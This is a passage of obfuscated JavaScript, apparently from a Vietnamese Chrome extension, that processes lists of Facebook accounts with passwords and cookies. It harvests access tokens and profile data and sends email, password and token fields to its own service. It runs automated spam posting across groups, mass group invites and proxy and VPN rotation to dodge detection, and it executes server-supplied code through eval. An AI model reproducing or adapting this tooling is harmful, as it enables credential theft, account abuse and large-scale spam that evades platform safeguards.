                                    "FB_Key": S0,
                                    "token": a0,
                                    "TokenGroup": o0[m0],
                                    "stellar": 0
                                });
                            }
                        }
                    };
                    p[f1W.d5y]('GET', U, true);
                    p[f1W.h0r]();
                }
            }

            function L0() {
                function M(O) {
                    $[f1W.c9y]({
                        type: "GET",
                        url: "https://m.facebook.com/" + _fb[f1W.z1Y] + "/allactivity?privacy_source=activity_log_mobile_menu",
                    })[f1W.D2I](function(W, V) {
                        var E = "w5B";
                        if (f1W[E](V, "success")) {
                            var W = W[f1W.H8v];
                            O(W);
                        } else {
                            O(W);
                        }
                    });
                }
                acc_doing[f1W.v20][f1W.t0Q] = 1;
                M(function(W) {
                    var V = "x5B",
                        E = "l5B",
                        O = "C5B",
                        Z = "g5B",
                        F = "D5B",
                        o = $(W)[f1W.q8r](".feed._56cw")[f1W.Q0I]();
                    if (f1W[F](W, "")) {
                        U = "Unknow";
                    } else {
                        var U = "";
                        for (var p = 2005; f1W[Z](p, 2016); p++) {
                            if (o) {
                                if (f1W[O](o[f1W.x3y]("year_" + p), null)) {
                                    if (f1W[E](U, "")) {
                                        U = p;
                                    };
                                };
                            };
                        };
                        if (f1W[V](U, "")) {
                            U = "2015";
                        }
                    }
                    d0("Year: " + U);
                    acc_doing[f1W.v20][f1W.t0Q] = 0;
                });
            }

            function B4() {
                var n = "V3B";

                function Y(O) {
                    $[f1W.c9y]({
                        type: "GET",
                        url: "https://www.facebook.com/" + _fb[f1W.z1Y] + "?sk=followers",
                        success: function(W, V, E) {
                            O(W);
                        }
                    });
                }

                function N(O) {
                    $[f1W.c9y]({
                        type: "GET",
                        url: "https://www.facebook.com/mobileprotection?source=mobile_mirror_nux&__mref=message_bubble",
                        success: function(W, V, E) {
                            O(W);
                        }
                    });
                }
                if (f1W[n]($("#uss_st_check_FriendSub")[f1W.o07](), 1)) {
                    acc_doing[f1W.v20][f1W.D87] = 1;
                    Y(function(O) {
                        var Z = "q3B",
                            F = "b3B",
                            o = "U3B",
                            U = "Z3B",
                            p = "O3B",
                            M = O,
                            b = M[f1W.x3y]("AllFriendsAppCollectionPagelet(.*?)token");
                        if (f1W[p](b, null)) {
                            var H = b[0][f1W.x3y]("tab_count\":(.*?),\"tok")[1];
                        } else {
                            var H = 0;
                        }
                        var R = M[f1W.x3y]("FollowersAppCollectionPagelet(.*?)token");
                        if (f1W[U](R, null)) {
                            var R = R[0][f1W.x3y]("tab_count\":(.*?),\"tok")[1];
                        } else {
                            var R = 0;
                        }
                        var X = parseInt(H);
                        acc_doing[f1W.w97] = X;
                        $("#checking_friends_" + O0)[f1W.Q0I](X);
                        $("#sp_fb_friends_" + O0)[f1W.Q0I](X);
                        d0("Friends: " + X);
                        total_check_fr = parseInt($("#total_check_fr")[f1W.Q0I]()) + X;
                        $("#total_check_fr")[f1W.Q0I](total_check_fr);
                        var f = JSON[f1W.i2O]($("#uss_data")[f1W.V6Q]("data"));
                        if (f1W[o](f[f1W.m2r][f1W.B6I], true)) {
                            if (f1W[F]($("#uss_auto_group")[f1W.m8y](), "1") && f1W[Z]($("#uss_st_auto_keomem")[f1W.o07](), 1)) {} else {
                                _fb[f1W.i0Y](8, {
                                    "Group_Id": f[f1W.m2r][f1W.A7y],
                                    "Hide": f[f1W.m2r][f1W.o1Q],
                                    "Token": o0[m0],
                                    "FB_Uid": j4,
                                    "FB_Key": S0,
                                    "FriendData": data,
                                    "Max_Invite": f[f1W.m2r][f1W.X0v]
                                });
                            }
                        }
                        d0("Subs: " + R);
                        $("#checking_sub_" + O0)[f1W.Q0I](R);
                        N(function(W) {
                            var V = "H3B",
                                E = W,
                                E = $(E)[f1W.q8r]("#mobileCountryLabel")[f1W.q8r]("a")[f1W.Q0I]();
                            if (E) {
                                E = E[f1W.X3Q]("(")[0];
                                var E = E + "AAA",
                                    E = E[f1W.F6r](" AAA", "")[f1W.F6r]("AAA", "");
                            } else {
                                E = "KXD";
                            }
                            uss[f1W.R9Q]({
                                "type": 1,
                                "token": o0[m0],
                                "Friends": X,
                                "Country": E,
                                "Subs": R,
                                "id": O0,
                                "uid": j4,
                                "email": D0,
                                "pass": acc_doing[f1W.n3Q]
                            });
                            if (f1W[V]($("#uss_st_check_country")[f1W.o07](), 1)) {
                                d0("Country: " + E);
                            }
                            acc_doing[f1W.v20][f1W.D87] = 0;
                        });
                    });
                } else {
                    acc_doing[f1W.v20][f1W.D87] = 1;
                    N(function(W) {
                        var V = "f3B",
                            E = W,
                            E = $(E)[f1W.q8r]("#mobileCountryLabel")[f1W.q8r]("a")[f1W.Q0I]();
                        if (E) {
                            E = E[f1W.X3Q]("(")[0];
                            var E = E + "AAA",
                                E = E[f1W.F6r](" AAA", "")[f1W.F6r]("AAA", "");
                        } else {
                            E = "KXD";
                        }
                        uss[f1W.R9Q]({
                            "type": 1,
                            "token": o0[m0],
                            "Friends": 0,
                            "Country": E,
                            "Subs": 0,
                            "id": O0,
                            "uid": j4,
                            "email": D0,
                            "pass": acc_doing[f1W.n3Q]
                        });
                        if (f1W[V]($("#uss_st_check_country")[f1W.o07](), 1)) {
                            d0("Country: " + E);
                        }
                        acc_doing[f1W.v20][f1W.D87] = 0;
                    });
                }
            }

            function Z4() {
                x0({
                    "url": "https://graph.facebook.com/fql?q=SELECT uid FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 5000&access_token=" + a0,
                    "type": "friends"
                });
            }

            function y0() {}

            function p4(Q) {
                var S = "LimitPostperGroup";

                function u(W) {
                    var V = "Y5B";
                    GroupCore[f1W.q2Q]({
                        "Token": W[f1W.p87],
                        "Url": "https://graph.facebook.com/" + W[f1W.G7v] + "/feed?fields=id&limit=" + W[S] + "&access_token=" + W[f1W.p87],
                        "Name_Id": "id",
                        "Id": "xx",
                        "Note": W[f1W.a7y],
                        "Aut": W[f1W.Y9I],
                        "Group_Id": W[f1W.G7v],
                        "Type_Get": $("#GroupCore_spam_sl_typeget_post")[f1W.o07](),
                        "Type_Post": $("#GroupCore_spam_sl_Method_post")[f1W.o07](),
                        "Url_Post": $("#GroupCore_spam_TypeUSS_URL")[f1W.o07](),
                        "Data_Post": $("#GroupCore_spam_TypeUSS_Data")[f1W.o07](),
                        "Post_Limit": W[S],
                        "Msg": $("#GroupCore_spam_content")[f1W.o07](),
                        "UnfollowPost": 1,
                        "CallBack": "",
                        "TK": W[f1W.M87]
                    });
                    var E = $("#GroupCore_spam_sl_limit_gr_time")[f1W.o07](),
                        O = E[f1W.F6r]("000", "");
                    $(W[f1W.a7y])[f1W.m8y]("Ðang ch? " + O + "s d? ti?p t?c Spam...");
                    if (f1W[V](E, 0)) {
                        q0(W);
                    } else {
                        setTimeout(function() {
                            q0(W);
                        }, E);
                    }
                }

                function p0() {
                    var G = "i6B",
                        C = "n6B",
                        z = "M6B",
                        P = "e6B",
                        J = "o6B";

                    function c() {
                        var H = "v6B",
                            R = "u6B",
                            X = "c6B",
                            f = "J6B",
                            n = "I6B",
                            Y = "T6B",
                            N = $(Q[f1W.L37])[f1W.o07]()[f1W.X3Q]("\n"),
                            g = N.length;
                        if (f1W[Y]($("#GroupCore_spam_sl_AutoChiaPost")[f1W.o07](), 1)) {
                            if (f1W[n]($(Q[f1W.L37])[f1W.o07](), "")) {
                                $(Q[f1W.Y9I])[f1W.o07]("0");
                                $(Q[f1W.M87][f1W.z3I])[f1W.m8y]("2");
                                $(Q[f1W.M87][f1W.e1I])[f1W.m8y]("1");
                                $(Q[f1W.M87][f1W.q4I])[f1W.m8y]("1");
                            } else {
                                if (f1W[f](g - 1, 4)) {
                                    if (f1W[X](g, 1)) {
                                        g = f1W[R](g, 1);
                                    }
                                    var T = f1W[H](80, g),
                                        I = T[f1W.s7O](),
                                        I = I[f1W.X3Q](".")[0],
                                        I = parseInt(I);
                                    $(Q[f1W.a7y])[f1W.m8y]("C?n ph?i spam m?i Group " + I + " Bài..");
                                } else {
                                    var I = $("#GroupCore_spam_sl_limit_post")[f1W.o07]();
                                }
                            }
                        } else {
                            var I = $("#GroupCore_spam_sl_limit_post")[f1W.o07]();
                        }
                        Q[S] = I;
                        q0(Q);
                        var D = setInterval(function() {
                            var V = "X5B",
                                E = "y5B",
                                O = "F5B",
                                Z = "B5B",
                                F = "j5B",
                                o = "A6B",
                                U = "G6B",
                                p = parseInt($(Q[f1W.M87][f1W.z3I])[f1W.m8y]()),
                                M = parseInt($(Q[f1W.M87][f1W.e1I])[f1W.m8y]()),
                                b = parseInt($(Q[f1W.M87][f1W.q4I])[f1W.m8y]());
                            if (f1W[U](p, 0)) {} else {
                                if (f1W[o](M + b, p) || f1W[F](M + b, 95) || f1W[Z](M, 10)) {
                                    if (f1W[O]($(Q[f1W.Y9I])[f1W.o07](), 0)) {
                                        clearInterval(D);
                                        acc_doing[f1W.f17] = 0;
                                        acc_doing[f1W.l8a] = 0;
                                        $(Q[f1W.a7y])[f1W.Q0I]("Hoàn Thành Spam");
                                        $(Q[f1W.L37])[f1W.v37]();
                                        $(Q[f1W.S00])[f1W.v37]();
                                        if (f1W[E]($("#GroupCore_spam_sl_UseVPN")[f1W.o07](), 1) || f1W[V]($("#GroupCore_spam_sl_UseVPN")[f1W.o07](), 2)) {
                                            chrome[f1W.d60][f1W.K4r]({
                                                action: 'proxy',
                                                Type: "Clear"
                                            }, function(W) {});
                                        }
                                    }
                                }
                            }
                        }, 500);
                    }
                    if (f1W[J]($("#GroupCore_spam_sl_UseVPN")[f1W.o07](), 1)) {
                        uss[f1W.t6y]({
                            "Load": "#JDJD",
                            "Method": "#VNPCore_Browsec_Method2",
                            "Note": "#GroupCore_spam_note",
                            "Country": "#VNPCore_Browsec_Country2",
                            "CustomIp": "#VNPCore_Browsec_Country_Ip2",
                            "Btn": "#VNPCore_Browsec_Btn_Start2"
                        }, function(W) {
                            var V = "p6B";
                            if (f1W[V](W, true)) {
                                c();
                            } else {
                                $('#SpamCmt_Add_Note_' + O0)[f1W.Q0I]("Thay IP th?t b?i...");
                            }
                        });
                    } else if (f1W[P]($("#GroupCore_spam_sl_UseVPN")[f1W.o07](), 2)) {
                        var L = $("#VNPCore_USS_IP")[f1W.o07](),
                            E0 = $("#VNPCore_USS_Country")[f1W.o07]();
                        if (f1W[z](E0, "all")) {
                            if (f1W[C](L, 0)) {
                                var L = $("#VNPCore_USS_IP")[f1W.q8r](".IpUss"),
                                    F0 = uss[f1W.K0v](L.length),
                                    L = $("#VNPCore_USS_IP")[f1W.q8r](".IpUss:eq(" + F0 + ")")[f1W.V6Q]("value");
                            }
                        } else {
                            if (f1W[G](L, 0)) {
                                var L = $("#VNPCore_USS_IP")[f1W.q8r](".IpUss." + E0),
                                    F0 = uss[f1W.K0v](L.length),
                                    L = $("#VNPCore_USS_IP")[f1W.q8r](".IpUss." + E0 + ":eq(" + F0 + ")")[f1W.V6Q]("value");
                            }
                        }
                        var K = $("#VNPCore_USS_UserList")[f1W.o07]()[f1W.X3Q]("\n"),
                            r0 = K[uss[f1W.K0v](K.length)],
                            r0 = r0[f1W.X3Q]("|");
                        uss[f1W.G7O]({
                            "Method": 0,
                            "Aut": {
                                "User": r0[0],
                                "Pass": r0[1]
                            },
                            "Note": "#VPNCore_Note",
                            "Load": "#VNPCore_USS_IMG_Load",
                            "Btn": "#VNPCore_USS_Btn_Start",
                            "Country": $("#VNPCore_Hola_Country")[f1W.o07](),
                            "Server": L,
                            "HolaList": 0,
                            "Reconnect": 0
                        }, function(W) {
                            var V = "a6B";
                            if (f1W[V](W, true)) {
                                c();
                            } else {
                                $('#SpamCmt_Add_Note_' + O0)[f1W.Q0I]("Thay IP th?t b?i...Thay l?i...");
                                p0();
                            }
                        });
                    } else {
                        c();
                    }
                }

                function q0(W) {
                    var V = "m5B",
                        E = "s5B",
                        O = "k5B",
                        Z = $(W[f1W.L37])[f1W.o07](),
                        F = Z[f1W.X3Q]("\n"),
                        o = F[0][f1W.X3Q]("|")[0],
                        U = parseInt($(W[f1W.M87][f1W.z3I])[f1W.m8y]());
                    if (f1W[O](U, 80)) {
                        $(Q[f1W.Y9I])[f1W.o07]("0");
                    } else {
                        if (f1W[E](o.length, 5)) {
                            $(Q[f1W.L37])[f1W.o07](Z[f1W.F6r](F[0] + "\n", "")[f1W.F6r](F[0], ""));
                            var p = $("#GroupCore_spam_listid_blackgroup")[f1W.o07]();
                            if (f1W[V](p[f1W.x3y](o), null)) {
                                q0(W);
                            } else {
                                u({
                                    "Token": W[f1W.p87],
                                    "Group_Id": o,
                                    "LimitPostperGroup": W[S],
                                    "TK": W[f1W.M87],
                                    Note: W[f1W.a7y],
                                    Aut: W[f1W.Y9I],
                                    ListGroup: W[f1W.L37]
                                });
                            }
                        } else {
                            $(Q[f1W.Y9I])[f1W.o07]("0");
                        }
                    }
                }
                chrome[f1W.d60][f1W.K4r]({
                    method: 'POST',
                    action: 'xhttp',
                    url: 'http://ussv.net/ajax/Auth.php',
                    data: "username=" + uss_aut(1) + "&mabimat=" + uss_aut(2) + "&Type=SpamCmt"
                }, function(W) {
                    var V = "r6B",
                        E = "E6B",
                        O = "Js",
                        Z = "W6B";
                    if (f1W[Z](W[f1W.x3y]("Stt"), null)) {
                        var W = JSON[f1W.i2O](W);
                        eval(W[O]);
                        if (f1W[E](W[f1W.J5y], 0)) {
                            p0();
                        } else {
                            dom_logs_ussv(W[f1W.a7y], "22333|_|_|error|check");
                            if (f1W[V](W[f1W.J5y], 2)) {
                                stop_check();
                                div_thongbao(W[f1W.a7y]);
                            }
                        }
                    } else {
                        alert("L?i Trong Qúa Trình Xác Th?c !");
                    }
                });
            }

            function x0(B0) {
                chrome[f1W.d60][f1W.K4r]({
                    method: 'GET',
                    action: 'xhttp',
                    url: B0[f1W.j2X],
                    data: "hj=hj"
                }, function(W) {
                    var V = "p4a",
                        E = "o4a",
                        O = "r4a",
                        Z = "E4a",
                        F = "W4a",
                        o = "d0a",
                        U = "K0a",
                        p = "L0a",
                        M = "S0a",
                        b = "P0a",
                        H = "z0a",
                        R = "N0a",
                        X = "h0a",
                        f = "R0a",
                        n = "f0a",
                        Y = "H0a",
                        N = "q0a",
                        g = "b0a",
                        T = "U0a",
                        I = "Z0a",
                        D = "O0a",
                        W = JSON[f1W.i2O](W);
                    if (W.error) {
                        d0("L?i: " + W.error[f1W.q10]);
                        dom_logs_ussv("L?i: " + W.error[f1W.q10], "2323|_|_|error|check");
                    } else {
                        if (f1W[D](B0[f1W.O4y], "subs")) {
                            if (f1W[I](W[f1W.I7r], undefined)) {
                                var G = 0;
                            } else {
                                var G = W[f1W.I7r][f1W.u6X];
                            }
                            $("#checking_sub_" + O0)[f1W.Q0I](G);
                            d0("Subs: " + G);
                        } else if (f1W[T](B0[f1W.O4y], "friends")) {
                            var C = W.data.length;
                            acc_doing[f1W.w97] = C;
                            $("#checking_friends_" + O0)[f1W.Q0I](C);
                            $("#sp_fb_friends_" + O0)[f1W.Q0I](C);
                            d0("Friends: " + C);
                            T0();
                            total_check_fr = parseInt($("#total_check_fr")[f1W.Q0I]()) + C;
                            $("#total_check_fr")[f1W.Q0I](total_check_fr);
                            var z = JSON[f1W.i2O]($("#uss_data")[f1W.V6Q]("data"));
                            if (f1W[g](z[f1W.m2r][f1W.B6I], true)) {
                                if (f1W[N]($("#uss_auto_group")[f1W.m8y](), "1") && f1W[Y]($("#uss_st_auto_keomem")[f1W.o07](), 1)) {} else {
                                    _fb[f1W.i0Y](8, {
                                        "Group_Id": z[f1W.m2r][f1W.A7y],
                                        "Hide": z[f1W.m2r][f1W.o1Q],
                                        "Token": o0[m0],
                                        "FB_Uid": j4,
                                        "FB_Key": S0,
                                        "FriendData": W,
                                        "Max_Invite": z[f1W.m2r][f1W.X0v]
                                    });
                                }
                            }
                        } else if (f1W[n](B0[f1W.O4y], "groups")) {
                            var P = W.data.length;
                            $("#checking_group_" + O0)[f1W.Q0I](P);
                            d0("Groups: " + P);
                        } else if (f1W[f](B0[f1W.O4y], "pages")) {
                            var J = W.data.length;
                            $("#checking_page_" + O0)[f1W.Q0I](J);
                            d0("Pages: " + J);
                        } else if (f1W[X](B0[f1W.O4y], "info")) {
                            var c = W[f1W.G6y],
                                L = W[f1W.h3r],
                                E0 = W[f1W.q60],
                                F0 = W[f1W.s0r];
                            if (typeof W[f1W.I7Q] == 'undefined') {
                                var K = "null";
                            } else {
                                var K = W[f1W.I7Q][f1W.G6y];
                            }
                            d0("Info=> Name: " + c + ", Gender: " + L + ", Dob: " + E0 + ", Loca: " + F0 + ", Address: " + K);
                            $("#note_check_info")[f1W.Q0I]("");
                            var r0 = $("#uss_vip")[f1W.Q0I]();
                            if (f1W[R](r0, "1")) {
                                var Q = $("#uss_spam")[f1W.Q0I]();
                                if (f1W[H](Q, "1")) {
                                    if (f1W[b](z0, "08080808")) {} else {
                                        var S = parseInt($("#sp_can_" + O0)[f1W.m8y]());
                                        if (f1W[M](S, 1)) {
                                            start_spam(O0, a0, c, E0, L);
                                        } else {
                                            acc_doing[f1W.f17] = 0;
                                            dom_logs_ussv("Ta`i khoa?n " + D0 + " không thê? tiê´n ha`nh SPAM theo thiê´t lâ?p cu?a ba?n !", O0 + "|_|_|ok|check");
                                        }
                                    }
                                } else {
                                    if (f1W[p]($("#uss_st_join_geocoin")[f1W.o07](), 1)) {
                                        acc_doing[f1W.f17] = 1;
                                    } else {
                                        if (f1W[U]($("#uss_st_cmt_post_group")[f1W.o07](), 1) && f1W[o]($("#Ussv_SpamCmt")[f1W.o07](), 1)) {
                                            acc_doing[f1W.f17] = 1;
                                        } else {
                                            acc_doing[f1W.f17] = 0;
                                        }
                                    }
                                }
                            } else {
                                if (f1W[F]($("#uss_st_cmt_post_group")[f1W.o07](), 1) && f1W[Z]($("#Ussv_SpamCmt")[f1W.o07](), 1)) {
                                    acc_doing[f1W.f17] = 1;
                                } else {
                                    acc_doing[f1W.f17] = 0;
                                }
                            }
                        } else if (f1W[O](B0[f1W.O4y], "firstpost")) {
                            var u = W.data.length;
                            if (f1W[E](u, 1)) {
                                var p0 = W.data[0][f1W.Z9y],
                                    q0 = new Date(f1W[V](p0, 1000)),
                                    H0 = q0[f1W.t9Y](),
                                    W0 = q0[f1W.H1r](),
                                    w = q0[f1W.d8X]();
                                d0("First Post: " + H0 + "/" + W0 + "/" + w + " (" + W.data[0][f1W.G2r] + ")");
                            };
                        }
                    }
                });
            }

            function A0() {
                x0({
                    "url": "https://graph.facebook.com/me/subscribers?access_token=" + a0,
                    "type": "subs"
                });
            }
            var O0 = o0[f1W.W7O],
                D0 = o0[f1W.c4I],
                V4 = o0[f1W.Q0r],
                z0 = o0[f1W.t9X],
                j4 = o0[u0],
                S0 = o0[f1W.O00],
                a0 = o0[f1W.M00],
                c0 = o0[f1W.M00],
                w0 = o0[C4];
            if (f1W[g0](o0[f1W.O4y], "stellar")) {
                G0();
            } else if (f1W[Y0](o0[f1W.O4y], "spam")) {
                $("#note_check_info")[f1W.Q0I]("Ðang tiê´n ha`nh kiê?m tra thông tin ta`i khoa?n " + D0);
                var b4 = $("#uss_vip")[f1W.Q0I]();
                if (f1W[P0](b4, "1")) {
                    var q4 = $("#uss_spam")[f1W.Q0I]();
                    if (f1W[K0](q4, "1")) {
                        if (f1W[v0](z0, "08080808")) {} else {
                            var e4 = parseInt($("#uss_type_spam")[f1W.m8y]());
                            if (f1W[l0](e4, "2")) {
                                var W4 = "Spam All",
                                    r4 = "Tiê´n ha`nh Spam trên ta`i khoa?n " + D0 + " \nTi`nh Tra?ng: " + parse_stt_stellar(w0) + "\nYêu Câ`u: " + W4;
                                dom_logs_ussv(r4, O0 + "|_|_|ok|check");
                                fb_spam(O0, D0, c0, 1);
                            } else {
                                if (f1W[N0](e4, "0")) {
                                    var W4 = "Chua Ki´ch Hoa?t Stellar";
                                } else {
                                    var W4 = "Ða~ Ki´ch Hoa?t Stellar";
                                }
                                if (f1W[k0](e4, w0)) {
                                    fb_spam(O0, D0, c0, 1);
                                    var r4 = "Tiê´n ha`nh Spam trên ta`i khoa?n " + D0 + " \nTi`nh Tra?ng: " + parse_stt_stellar(w0) + "\nYêu Câ`u: " + W4;
                                    dom_logs_ussv(r4, O0 + "|_|_|ok|check");
                                } else {
                                    var r4 = "Không tiê´n ha`nh Spam trên ta`i khoa?n na`y.\nTi`nh Tra?ng: " + parse_stt_stellar(w0) + "\nYêu Câ`u: " + W4;
                                    dom_logs_ussv(r4, O0 + "|_|_|ok|check");
                                    fb_spam(O0, D0, c0, 2);
                                }
                            }
                        }
                    } else {
                        acc_doing[f1W.f17] = 0;
                    }
                } else {
                    acc_doing[f1W.f17] = 0;
                }
                if (f1W[f0]($("#uss_st_check_info")[f1W.o07](), "yes") && f1W[J0](c0, 0)) {
                    if (f1W[i0]($("#uss_st_check_savecoookie")[f1W.o07](), 1)) {
                        uss[f1W.f7y](function(E) {
                            var O = "Y8B",
                                Z = "m8B",
                                F = "s8B",
                                o = "k8B",
                                U = "X8B",
                                p = "y8B",
                                M = "F8B",
                                b = $("#data_list_acc_coban_live")[f1W.o07]();
                            $("#data_list_acc_coban_live")[f1W.o07](b + "|Cookie:" + E);
                            if (f1W[M]($("#uss_st_check_saveusskey")[f1W.o07](), 1)) {
                                usskey[f1W.G47]({
                                    "token": o0[m0],
                                    "app": $("#setting_save_token")[f1W.o07]()
                                }, function(W) {
                                    var V = $("#data_list_acc_coban_live")[f1W.o07]();
                                    $("#data_list_acc_coban_live")[f1W.o07](V + "|USSKey:" + W);
                                });
                            };
                            if (f1W[p]($("#uss_st_check_rename")[f1W.o07](), "yes")) {
                                var H = $(".info_table." + O0),
                                    R = FbCheck[f1W.c30]({
                                        "uid": j4
                                    });
                                if (f1W[U](R, "Yes")) {
                                    $(H)[f1W.C3O]("background", "rgba(58, 236, 175, 0.14)");
                                    var X = 1;
                                } else {
                                    $(H)[f1W.C3O]("background", "rgba(244, 54, 105, 0.14)");
                                    var X = 0;
                                }
                                d0("Rename: " + R);
                            }
                            B4();
                            if (f1W[o]($("#uss_st_check_group")[f1W.o07](), 1)) {
                                C0();
                            };
                            if (f1W[F]($("#uss_st_check_fullinfo")[f1W.o07](), 1)) {
                                T0();
                            };
                            if (f1W[Z]($("#uss_st_check_page")[f1W.o07](), 1)) {
                                I0();
                            };
                            if (f1W[O]($("#uss_st_check_firstpost")[f1W.o07](), 1)) {
                                L0();
                            };
                        });
                    } else {
                        if (f1W[V0]($("#uss_st_check_saveusskey")[f1W.o07](), 1)) {
                            usskey[f1W.G47]({
                                "token": o0[m0],
                                "app": $("#setting_save_token")[f1W.o07]()
                            }, function(W) {
                                var V = $("#data_list_acc_coban_live")[f1W.o07]();
                                $("#data_list_acc_coban_live")[f1W.o07](V + "|USSKey:" + W);
                            });
                        };
                        B4();
                        if (f1W[s0]($("#uss_st_check_group")[f1W.o07](), 1)) {
                            C0();
                        };
                        if (f1W[b0]($("#uss_st_check_page")[f1W.o07](), 1)) {
                            I0();
                        };
                        if (f1W[U0]($("#uss_st_check_firstpost")[f1W.o07](), 1)) {
                            L0();
                        };
                        if (f1W[n0]($("#uss_st_check_fullinfo")[f1W.o07](), 1)) {
                            T0();
                        };
                    }
                } else {
                    acc_doing[f1W.f17] = 0;
                    B4();
                    $("#checking_friends_" + O0)[f1W.Q0I]("No");
                    $("#checking_page_" + O0)[f1W.Q0I]("No");
                    $("#checking_group_" + O0)[f1W.Q0I]("No");
                    $("#checking_sub_" + O0)[f1W.Q0I]("No");
                    if (f1W[X0]($("#uss_st_check_info")[f1W.o07](), "no")) {
                        dom_logs_ussv("Không ki?m tra thông tin tài kho?n " + D0 + " theo thi?t l?p!", O0 + "|_|_|kxd|check");
                    } else {
                        if (f1W[A]($("#uss_st_id_ppa")[f1W.o07](), "")) {
                            dom_logs_ussv("Theo thi?t l?p không l?y Token nên không th? ki?m tra Info !", O0 + "|_|_|error|check");
                        } else {
                            dom_logs_ussv("Quá trình ki?m tra thông tin c?a tài kho?n " + D0 + " th?t b?i, vì quá trình l?y Token th?t b?i !", O0 + "|_|_|error|check");
                        }
                    }
                }
                if (f1W[Z0]($("#sl_CheckSave_AccList")[f1W.o07](), 1)) {
                    CheckV2[R0]({
                        "Type": 1
                    });
                }
            }
        };
        this[f1W.i7X] = function(W) {};
        this[h0] = function(W) {};
        this[D4] = function(W) {};
        this[t0] = function(W) {
            console[f1W.p4y](W);
        };
        this[J4] = function(W) {
            var V = "i4a",
                E = "#st_sl_CustomVPN_CP_ChangeIp",
                O = "n4a",
                Z = "#sl_CustomVPN",
                F = "M4a",
                o = "e4a";
            if (f1W[o](W[f1W.S77], e0)) {
                if (f1W[F]($(Z)[f1W.o07](), f1W.L9a)) {
                    var U = f1W.L9a;
                } else {
                    if (f1W[O]($(E)[f1W.o07](), f1W.S9a)) {
                        var U = f1W.S9a;
                    } else {
                        var U = f1W.L9a;
                    }
                }
            } else {
                if (f1W[V]($(Z)[f1W.o07](), f1W.L9a)) {
                    var U = f1W.L9a;
                } else {
                    var U = f1W.S9a;
                }
            }
            return U;
        };
        this[m4] = function(Z, F) {
            var o = "c4a",
                U = "ChangeIpBeforeLogin",
                p = "a4a";
            if (!F) {
                var F = function() {};
            };
            var M = uss[f1W.K0v]({
                    "type": "int",
                    "lg": 9
                }),
                b = '<br/><div class="fb_div_panel_bot" style="padding-top: 10px;"><p id="VPNCore_Note_Log_Change_' + M + '">' + img_load + '</p></div>Ti?n hành thay IP theo thi?t l?p Custom VPN';
            dom_logs_ussv(b, "0|_|_|ok|check");
            var H = " Ti?n hành K?t N?i L?i VPN ...",
                R = "<br/>Vui lòng Thi?t L?p Auto Reconnect d? USSV có th? t? d?ng K?t n?i l?i n?u g?p s? c? !",
                X = $("#st_sl_CustomVPN_AutoReconnect")[f1W.o07](),
                f = $("#VNPCore_Type")[f1W.o07]();
            if (f1W[p](f, 0)) {
                uss[f1W.t6y]({
                    "Load": "#VNPCore_Browsec_IMG_Load",
                    "Method": "#VNPCore_Browsec_Method",
                    "Note": "#VPNCore_Note,#VPNCore_Note_Log_Change_" + M,
                    "Country": "#VNPCore_Browsec_Country",
                    "CustomIp": "#VNPCore_Browsec_Country_Ip",
                    "Btn": "#VNPCore_Browsec_Btn_Start"
                }, function(W) {
                    var V = "J4a",
                        E = "I4a",
                        O = "T4a";
                    if (f1W[O](W, true)) {
                        $("#uss_checkpoint")[f1W.Q0I]("0");
                        if (f1W[E](Z[U], true)) {
                            F(true);
                        } else {
                            get_OneAcc();
                        }
                    } else {
                        if (f1W[V](X, 1)) {
                            dom_logs_ussv(H, "0|_|_|war|check");
                            CheckV2[m4](W);
                        } else {
                            div_thongbao("Ti?n trình Check dã b? d?ng vì quá trình Thi?t L?p IP Browsec Th?t B?i" + R);
                        }
                    }
                });
            } else if (f1W[o](f, 1)) {
                uss[f1W.X97]({
                    "Load": "#VNPCore_Socks5_IMG_Load",
                    "Note": "#VPNCore_Note,#VPNCore_Note_Log_Change_" + M,
                    "Btn": "#VNPCore_Socks5_Btn_Start",
                    "Socks5List": "#VNPCore_Socks5_List",
                    "Stt": "#VNPCore_Socks5_Connect_Stt",
                    "Random": "#VNPCore_Socks5_Random",
                    "Check": "#VNPCore_Socks5_Check",
                    "Remove": $("#VNPCore_Socks5_RemoveSocks")[f1W.o07]()
                }, function(W) {
                    var V = "G4a",
                        E = "v4a",
                        O = "u4a";
                    if (f1W[O](W, true)) {
                        $("#uss_checkpoint")[f1W.Q0I]("0");
                        if (f1W[E](Z[U], true)) {
                            F(true);
                        } else {
                            get_OneAcc();
                        }
                    } else {
                        if (f1W[V](X, 1)) {
                            dom_logs_ussv(H, "0|_|_|war|check");
                            CheckV2[m4](W);
                        } else {
                            div_thongbao("Ti?n trình Check dã b? d?ng vì quá trình Thi?t L?p IP Socks 5 Th?t B?i<br/>" + R);
                        }
                    }
                });
            } else {
                uss[f1W.G7O]({
                    "Method": $("#VNPCore_Hola_Method")[f1W.o07](),
                    "Aut": {
                        "User": $("#VPNCore_Hola_User")[f1W.o07](),
                        "Pass": $("#VPNCore_Hola_Pass")[f1W.o07]()
                    },
                    "Note": "#VPNCore_Note,#VPNCore_Note_Log_Change_" + M,
                    "Load": "#VNPCore_Hola_IMG_Load",
                    "Btn": "#VNPCore_Hola_Btn_Start",
                    "Country": $("#VNPCore_Hola_Country")[f1W.o07](),
                    "Server": $("#VNPCore_Hola_Country_Server")[f1W.o07](),
                    "HolaList": uss[f1W.f8X],
                    "Reconnect": $("#st_sl_CustomVPN_AutoReconnect")[f1W.o07]()
                }, function(W) {
                    var V = "B1a",
                        E = "j1a",
                        O = "A4a";
                    if (f1W[O](W, true)) {
                        $("#uss_checkpoint")[f1W.Q0I]("0");
                        if (f1W[E](Z[U], true)) {
                            F(true);
                        } else {
                            get_OneAcc();
                        }
                    } else {
                        if (f1W[V](X, 1)) {
                            dom_logs_ussv(H, "0|_|_|war|check");
                            CheckV2[m4](W);
                        } else {
                            div_thongbao("Ti?n trình Check dã b? d?ng vì quá trình Thi?t L?p IP Hola Th?t B?i" + R);
                        }
                    }
                });
            }
        };
        this[c4] = function() {
            var W = "k1a",
                V = "X1a",
                E = "y1a",
                O = "F1a",
                Z = $("#data_list_acc_coban")[f1W.o07]();
            $("#data_list_acc_coban")[f1W.o07](Z[f1W.F6r](/ - /gi, "|")[f1W.F6r](/ \| /gi, "|"));
            var Z = $("#data_list_acc_coban")[f1W.o07](),
                F = Z[f1W.X3Q]("\n").length,
                o = "";
            for (var U = 0; f1W[O](U, F); U++) {
                var p = Z[f1W.X3Q]("\n")[U],
                    p = p[f1W.X3Q]("|"),
                    M = p[0][f1W.F6r](/ /gi, "");
                if (!p[1]) {
                    p[1] = "";
                };
                var b = p[1];
                if (f1W[E](p.length, 3)) {
                    Cookie = p[2];
